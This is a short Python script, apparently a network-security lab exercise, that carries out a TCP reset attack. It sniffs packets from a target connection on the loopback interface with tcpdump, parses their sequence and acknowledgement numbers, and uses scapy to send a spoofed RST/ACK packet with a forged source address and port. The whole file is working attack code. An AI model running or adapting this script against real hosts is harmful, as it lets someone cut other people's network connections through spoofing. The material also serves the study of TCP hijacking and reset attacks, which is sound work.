import subprocess
from logging import info, debug
from scapy.config import conf
from scapy.layers.inet import IP, TCP
from scapy.sendrecv import send
from scapy.supersocket import L3RawSocket

base_address = "127.0.0.3"

def parse(string, begin):
    lis = string.split()
    pos = lis.index('>')
    tmp = lis[pos + 1]
    dst, dport = tmp.strip(':').split('.')
    dport = int(dport)
    if dst == "localhost":
        dst = base_address
    pos = lis.index("ack")
    ack = int(lis[pos + 1].strip(','))
    seq = 0
    if "seq" in lis:
        pos = lis.index("seq")
        seq = int(lis[pos + 1].split(':')[-1].strip(','))
        if begin == False:
            seq -= int(lis[pos + 1].split(':')[0].strip(','))
    return (dst, dport, ack, seq)


def attack(a_addr):
    conf.L3socket = L3RawSocket
    cmd = ["tcpdump", "-S", "-c", "10", "-i", "lo", f"src {a_addr[0]}", "and", f"src port {a_addr[1]}", "and", "tcp"]
    packets = subprocess.run(cmd, capture_output=True, check=True)
    out = packets.stdout.decode("utf-8").split('\n')
    for i in range(len(out)):
        debug(out[i])
    ack = 0
    seq = 0
    dst = ''
    dport = 0
    dst, dport, ack, seq = parse(out[0].strip(), True)
    adding_seq = 0
    while len(out) > 1:
        cur = out.pop()
        if not cur:
            continue
        dst, dport, new_ack, new_seq = parse(cur, False)
        ack = max(new_ack, ack)
        adding_seq = max(new_seq, adding_seq)
        if 'seq' in cur:
            debug(len(out))
            break
    debug(f"{ack} {seq}")
    info("start attack message")
    my_pack = IP(dst=a_addr[0], src=dst) / TCP(flags='AR', seq=ack, ack=seq, dport=a_addr[1], window=512, sport=dport)
    info("rst sent")
    send(my_pack, iface="lo")
